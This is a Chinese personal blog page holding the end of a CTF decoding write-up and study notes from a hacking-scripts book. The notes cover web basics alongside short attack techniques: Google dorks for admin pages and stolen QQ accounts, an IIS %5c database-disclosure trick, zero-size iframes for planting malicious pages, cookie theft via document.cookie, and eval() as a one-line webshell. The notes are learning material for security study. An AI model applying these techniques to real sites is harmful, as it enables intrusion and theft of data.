<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">str &#x3D; &quot;76;&amp;#122;&amp;#69;&amp;#120;&amp;#79;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#69;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#52;&amp;#76;&amp;#122;&amp;#107;&amp;#53;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#77;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#107;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#105;&amp;#56;&amp;#120;&amp;#77;&amp;#84;&amp;#69;&amp;#118;&amp;#79;&amp;#84;&amp;#99;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#50;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#105;&amp;#56;&amp;#53;&amp;#78;&amp;#121;&amp;#56;&amp;#53;&amp;#79;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#99;&amp;#118;&amp;#79;&amp;#84;&amp;#99;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#119;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#67;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#65;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#105;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#69;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#119;&amp;#76;&amp;#122;&amp;#107;&amp;#53;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#84;&amp;#107;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#67;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#103;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#119&quot;</span><br><span class="line">str &#x3D; str.split(&quot;;&amp;#&quot;);</span><br><span class="line">text &#x3D; &quot;&quot;</span><br><span class="line">for s in str:</span><br><span class="line">	text +&#x3D; chr(int(s))</span><br><span class="line">print(text)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LzExOS8xMDEvMTA4Lzk5LzExMS8xMDkvMTAxLzExNi8xMTEvOTcvMTE2LzExNi85Ny85OS8xMDcvOTcvMTEwLzEwMC8xMDAvMTAxLzEwMi8xMDEvMTEwLzk5LzEwMS8xMTkvMTExLzExNC8xMDgvMTAw</span><br></pre></td></tr></table></figure>
<p><strong>第三步</strong></p>
<p>将其进行base64解码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">119&#x2F;101&#x2F;108&#x2F;99&#x2F;111&#x2F;109&#x2F;101&#x2F;116&#x2F;111&#x2F;97&#x2F;116&#x2F;116&#x2F;97&#x2F;99&#x2F;107&#x2F;97&#x2F;110&#x2F;100&#x2F;100&#x2F;101&#x2F;102&#x2F;101&#x2F;110&#x2F;99&#x2F;101&#x2F;119&#x2F;111&#x2F;114&#x2F;108&#x2F;100</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>最后一步</strong></p>
<p>将其转换为ascill码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">welcometoattackanddefenceworld</span><br></pre></td></tr></table></figure>
<p>添加格式，即为flag</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/12/31/CTF%E7%AD%94%E6%A1%88%E8%AE%B0%E5%BD%95/" data-id="ckk1u3o4n0004tsus49echjil" data-title="CTF答案记录" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-精通黑客脚本笔记" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/12/23/%E7%B2%BE%E9%80%9A%E9%BB%91%E5%AE%A2%E8%84%9A%E6%9C%AC%E7%AC%94%E8%AE%B0/" class="article-date">
  <time class="dt-published" datetime="2020-12-23T12:56:36.000Z" itemprop="datePublished">2020-12-23</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/12/23/%E7%B2%BE%E9%80%9A%E9%BB%91%E5%AE%A2%E8%84%9A%E6%9C%AC%E7%AC%94%E8%AE%B0/">精通黑客脚本笔记</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="第三章"><a href="#第三章" class="headerlink" title="第三章"></a>第三章</h2><h1 id="第二章-常见脚本漏洞演练"><a href="#第二章-常见脚本漏洞演练" class="headerlink" title="第二章 常见脚本漏洞演练"></a>第二章 常见脚本漏洞演练</h1><h2 id="Google-Hack技术大演练"><a href="#Google-Hack技术大演练" class="headerlink" title="Google Hack技术大演练"></a>Google Hack技术大演练</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">intitle:管理登录 filetype:php # 搜索存在敏感信息的网站</span><br><span class="line">payment site:fr # 法国的相关支付界面</span><br><span class="line">inurl:qq.txt # 搜索被盗的qq号</span><br><span class="line">site:baidu.com # 搜索子域名</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="暴库漏洞攻击"><a href="#暴库漏洞攻击" class="headerlink" title="暴库漏洞攻击"></a>暴库漏洞攻击</h2><p>conn.asp是数据库连接文件，包含了被调用数据库的路径及数据库名</p>
<p>conn.asp暴库原理为，直接访问conn.asp时，相对路径出错</p>
<p>/改成%5c。%5c在16进制中为\。当IIS遇到\，IIS以为遇到了一个虚拟目录，便停止解析，从而报错</p>
<h1 id="第三章-HTML语言入门"><a href="#第三章-HTML语言入门" class="headerlink" title="第三章 HTML语言入门"></a>第三章 HTML语言入门</h1><h2 id="自定义头像跨站漏洞"><a href="#自定义头像跨站漏洞" class="headerlink" title="自定义头像跨站漏洞"></a>自定义头像跨站漏洞</h2><p>若写入跨站代码后，返回数据上出现字符，则存在跨站漏洞。只需要将HTML中标签闭合即可。</p>
<h2 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h2><p>隐藏域页面中不饿建，通常用来收集或发送信息</p>
<h2 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h2><frameset>不能放在<body>或<head>标签中

<p>动态框架<iframe>可以实现在网页内部嵌入网页，但是其中的src属性也带来了挂马风险。挂马时，把该标签的高度、宽度、frameborder设置为0</p>
<h1 id="第四章-Javascript和Vbscript入门"><a href="#第四章-Javascript和Vbscript入门" class="headerlink" title="第四章 Javascript和Vbscript入门"></a>第四章 Javascript和Vbscript入门</h1><p>通过Javascript程序，可以控制web页面的外观，也能够检测用户数据的有效性，而这些操作都不需要和服务器进行交互，这样就减轻了服务器的处理数据负担。</p>
<p>事件是Javascript让页面活起来的驱动力，所有的Javascript都是对某个事件做出的操作和反应</p>
<h2 id="Javascript基础"><a href="#Javascript基础" class="headerlink" title="Javascript基础"></a>Javascript基础</h2><p>document.writeln()在添加<pre>标签后，才会有换行作用。</p>
<p>三种交互方法：alert()，confirm()，prompt()</p>
<p>变量区分大小写</p>
<p>BOM，browser object model，浏览器对象模型</p>
<p>通过Javascript内置对象navigator我么可以知道当前使用的浏览器是那种类型，那种版本，是否支持java，当前浏览器插件信息等</p>
<p>window对象在使用时，允许省略。如window.alert省略为alert</p>
<p>DOM，document object model，文档对象模型</p>
<p>document.cookie可以获取cookie，用于窃取cookie</p>
<h2 id="VBScript基础"><a href="#VBScript基础" class="headerlink" title="VBScript基础"></a>VBScript基础</h2><p>VBScript只有一种数据类型Variant</p>
<p>为了不影响程序运行效率和养成良好变成习惯，先声明变量再赋值。使用dim</p>
<h2 id="使用cookie"><a href="#使用cookie" class="headerlink" title="使用cookie"></a>使用cookie</h2><p>通过document.cookie进行设置并取用</p>
<p>HTTP Set-Cookie头的格式为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie:name&#x3D;value;[expires&#x3D;date];[path&#x3D;pathname];[domain&#x3D;domainname];[secure];</span><br><span class="line">方括号为可以省略的部分</span><br></pre></td></tr></table></figure>
<p>设置cookie的格式为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie&#x3D;encodeURI(&quot;name&quot;)+&quot;&#x3D;&quot;+encodeURI(name)+&quot;;&quot;</span><br></pre></td></tr></table></figure>
<p>escape和encodeURI都可以用来对字符进行编码。escape将非字母字符转换为用字符和数字表示的等价字符串；encodeURI类似。</p>
<h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><h3 id="正则表达式对象方法"><a href="#正则表达式对象方法" class="headerlink" title="正则表达式对象方法"></a>正则表达式对象方法</h3><h4 id="test"><a href="#test" class="headerlink" title="test()"></a>test()</h4><p>lastIndex属性返回下一次字符串搜索开始的位置。若为全局搜索，返回最后一个匹配的字符串后面一个字符的位置</p>
<h4 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h4><p>lastIndex属性返回前一次匹配字符串的第一个字符的位置</p>
<h3 id="正则表达式的字符串对象的方法"><a href="#正则表达式的字符串对象的方法" class="headerlink" title="正则表达式的字符串对象的方法"></a>正则表达式的字符串对象的方法</h3><p>match,</p>
<h2 id="跨站攻击"><a href="#跨站攻击" class="headerlink" title="跨站攻击"></a>跨站攻击</h2><p>UBB，Ultimate Bulletin Board，一种tag语法代码</p>
<p>① 过滤用户提交变量中的&lt;和&gt;，从而防止用户自行构造html标记</p>
<p>② 过滤其中的：代码，从而防止javascript和vbscript的执行</p>
<p>③ 过滤或转换空格字符</p>
<h1 id="第五章-数据库基础"><a href="#第五章-数据库基础" class="headerlink" title="第五章 数据库基础"></a>第五章 数据库基础</h1><h2 id="利用SQL进行数据查询"><a href="#利用SQL进行数据查询" class="headerlink" title="利用SQL进行数据查询"></a>利用SQL进行数据查询</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE tablename (field type[(size)][NOT NULL]&#123;, field type [(size)][NOT NULL]&#125;[, PRIMARY KEY(field&#123;,field...&#125;)]);</span><br><span class="line">SELECT[ALL|DISTINCT]&#123;expr[[AS]c_alias&#123;,expr[[AS]c_alias]...&#125;&#125; from tableref&#123;,tableref...&#125; [where&lt;search_condition]</span><br><span class="line">SELECT DISTINCT id FROM hack</span><br><span class="line">SELECT id AS 标识, name AS 姓名, city AS 城市, age AS 年龄 FROM hack</span><br><span class="line">SELECT * FROM hack GROUP BY age</span><br><span class="line">SELECT * FROM hack WHERE city&#x3D;(SELECT city FROM hack WHERE id&#x3D;100)</span><br></pre></td></tr></table></figure>
<p>集合函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">COUNT(column_name) 统计column_name列非空的元组数目</span><br><span class="line">SUM(column_name) 统计column_name列的值的和</span><br><span class="line">AVG(column_name)</span><br><span class="line">MAX(column_name)</span><br><span class="line">MIN(column_name)</span><br></pre></td></tr></table></figure>
<p>子查询结果是集合时，谓语关键词可以使用IN，ANY/ALL，EXISTS</p>
<h1 id="第六章-ASP基础"><a href="#第六章-ASP基础" class="headerlink" title="第六章 ASP基础"></a>第六章 ASP基础</h1><h2 id="ASP常用内置对象"><a href="#ASP常用内置对象" class="headerlink" title="ASP常用内置对象"></a>ASP常用内置对象</h2><h3 id="Request"><a href="#Request" class="headerlink" title="Request"></a>Request</h3><p>用于得到用户提交的数据</p>
<p>用querystring获取GET，用form获取POST</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">myname&#x3D;request.querystring(&quot;name&quot;) #GET方式</span><br><span class="line">myname&#x3D;request.form(&quot;name&quot;) #POST方式</span><br></pre></td></tr></table></figure>
<h3 id="Response"><a href="#Response" class="headerlink" title="Response"></a>Response</h3><p>将服务器数据发送到用户的浏览器上</p>
<p>write方法，将数据输出到客户端</p>
<p>redirect方法，重定向，需要设置Response对象的Buffer属性为真</p>
<p>Status属性，HTTP响应的状态码</p>
<h3 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h3><p>扩展asp功能，可以利用符合COM接口的第三方组件</p>
<p>CreateObject()方法，利用符合COM接口的第三方组件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set myVar &#x3D; Server.CreateObject(&quot;ADODB.connection&quot;)</span><br></pre></td></tr></table></figure>
<p>HTMLEncode()方法，用于字符串编码，可防止跨站漏洞</p>
<p>URLEncode()方法，字符串以URL的编码输出</p>
<h3 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h3><p>存储特定用户会话所需的信息</p>
<h2 id="ASP组件"><a href="#ASP组件" class="headerlink" title="ASP组件"></a>ASP组件</h2><p>即ActiveX</p>
<h2 id="ADO"><a href="#ADO" class="headerlink" title="ADO"></a>ADO</h2><p>ActiveX Data Objects，ActiveX数据对象</p>
<h1 id="第九章-PHP基础"><a href="#第九章-PHP基础" class="headerlink" title="第九章 PHP基础"></a>第九章 PHP基础</h1><h2 id="快速入门"><a href="#快速入门" class="headerlink" title="快速入门"></a>快速入门</h2><p>一个PHP文件由五个部分组成：HTML、PHP标记、PHP语句、空格、注释</p>
<h3 id="PHP标记风格"><a href="#PHP标记风格" class="headerlink" title="PHP标记风格"></a>PHP标记风格</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo &#39;内容&#39;; ?&gt;</span><br><span class="line">#XML风格</span><br><span class="line">&lt;? echo &#39;内容&#39;; ?&gt; </span><br><span class="line">#简短风格，需要在php.ini中启用short_open_tag，且是默认启用</span><br><span class="line">&lt;SCRIPT LANGUAGE&#x3D;&#39;php&#39;&gt;echo &#39;内容&#39;;&lt;&#x2F;SCRIPT&gt; </span><br><span class="line">#SCRIPT风格</span><br><span class="line">&lt;% echo &#39;内容&#39; %&gt; </span><br><span class="line"># ASP风格，需要启用asp_tags，默认不启用</span><br></pre></td></tr></table></figure>
<h3 id="访问表单变量"><a href="#访问表单变量" class="headerlink" title="访问表单变量"></a>访问表单变量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$display # 需要开启register_globals，默认不开启</span><br><span class="line">$_POST[&#39;display&#39;] # 默认</span><br><span class="line">$HTTP_POST_VARS[&#39;display&#39;] # 弃用 </span><br></pre></td></tr></table></figure>
<h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$GLOBALS、$_SERVER、$_GET、$_POST、$_COOKIE、$_FILES、$_ENV、$_REQUEST、$_SESSION</span><br></pre></td></tr></table></figure>
<h2 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a>字符串操作</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">trim() # 去除空格</span><br><span class="line">addslshes() # 转移字符</span><br><span class="line">stripslashes() # 与addslshes功能相反</span><br><span class="line">php.ini中的magic_quotes_gpc配置指令 # 若为TRUE，则会实现addslshes和stripslashes</span><br></pre></td></tr></table></figure>
<h2 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$db &#x3D; new mysqli(&#39;主机名&#39;，&#39;MYSQL用户名&#39;, &#39;MYSQL密码&#39;,&#39;需要访问的数据库&#39;)</span><br><span class="line">$db &#x3D; mysqli_connect(&#39;主机名&#39;，&#39;MYSQL用户名&#39;, &#39;MYSQL密码&#39;,&#39;需要访问的数据库&#39;)</span><br><span class="line"></span><br><span class="line">$result &#x3D; mysql_query(&quot;select * from hack&quot;)</span><br><span class="line">$result &#x3D; mysql_db_query(&quot;crack&quot;,&quot;select * from hack&quot;)</span><br></pre></td></tr></table></figure>
<h2 id="高级功能"><a href="#高级功能" class="headerlink" title="高级功能"></a>高级功能</h2><h3 id="与文件系统和服务器交互"><a href="#与文件系统和服务器交互" class="headerlink" title="与文件系统和服务器交互"></a>与文件系统和服务器交互</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#上传</span><br><span class="line">在超级全局数组$_FILES中处理（需要register_global开启）</span><br><span class="line"></span><br><span class="line">#目录文件</span><br><span class="line">opendir()</span><br><span class="line">readdir()</span><br><span class="line">closedir()</span><br><span class="line">mkdir()</span><br><span class="line">basename(),dirname()</span><br><span class="line">rmdir()</span><br><span class="line">copy()</span><br><span class="line">rename()</span><br><span class="line"></span><br><span class="line">#程序执行函数</span><br><span class="line">exec(string command[,array &amp;result[,int &amp;result_value]]) # 只返回命令结果的最后一行，若以result传递变量，将获得返回字符串数组；若result_value传递变量，将获得返回代码</span><br><span class="line">passthru() #将结果直接输出并显示在浏览器</span><br><span class="line">system() #将结果直接输出并显示在浏览器</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="会话控制"><a href="#会话控制" class="headerlink" title="会话控制"></a>会话控制</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setcookie()</span><br><span class="line">session_get_cookie_params()</span><br></pre></td></tr></table></figure>
<h3 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval()</span><br></pre></td></tr></table></figure>
<h1 id="第十章-PHP程序常见问题"><a href="#第十章-PHP程序常见问题" class="headerlink" title="第十章 PHP程序常见问题"></a>第十章 PHP程序常见问题</h1><h2 id="PHP注射漏洞"><a href="#PHP注射漏洞" class="headerlink" title="PHP注射漏洞"></a>PHP注射漏洞</h2><p>intval() 将所有数据强制转换为数字</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/12/23/%E7%B2%BE%E9%80%9A%E9%BB%91%E5%AE%A2%E8%84%9A%E6%9C%AC%E7%AC%94%E8%AE%B0/" data-id="ckk1u3o4l0003tsus645bcfkw" data-title="精通黑客脚本笔记" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-hello-my-blog" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/12/22/hello-my-blog/" class="article-date">
  <time class="dt-published" datetime="2020-12-22T08:02:53.000Z" itemprop="datePublished">2020-12-22</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/12/22/hello-my-blog/">hello my blog</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/12/22/hello-my-blog/" data-id="ckk1u3o4h0001tsus1mci359t" data-title="hello my blog" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  


</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2021/01/19/CTF-Web-PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">CTF_Web PHP代码审计</a>
          </li>
        
          <li>
            <a href="/2021/01/15/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">SQL注入总结</a>
          </li>
        
          <li>
            <a href="/2021/01/12/hello-world/">Hello World</a>
          </li>
        
          <li>
            <a href="/2020/12/31/CTF%E7%AD%94%E6%A1%88%E8%AE%B0%E5%BD%95/">CTF答案记录</a>
          </li>
        
          <li>
            <a href="/2020/12/23/%E7%B2%BE%E9%80%9A%E9%BB%91%E5%AE%A2%E8%84%9A%E6%9C%AC%E7%AC%94%E8%AE%B0/">精通黑客脚本笔记</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2021 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>